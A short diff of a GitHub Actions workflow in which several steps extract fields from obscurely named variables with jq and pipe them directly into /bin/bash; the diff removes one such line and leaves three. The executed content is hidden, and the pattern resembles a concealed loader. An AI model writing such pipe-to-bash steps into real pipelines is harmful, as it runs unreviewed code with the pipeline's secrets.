@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$thci1" | jq -r .hp458 | /bin/bash
           printf '%s' "$o912" | jq -r .ihw9741 | /bin/bash
           echo $pwyla7 | jq -r .tfhrf5 | /bin/bash
-          echo $vjmuh52 | jq -r .t492 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
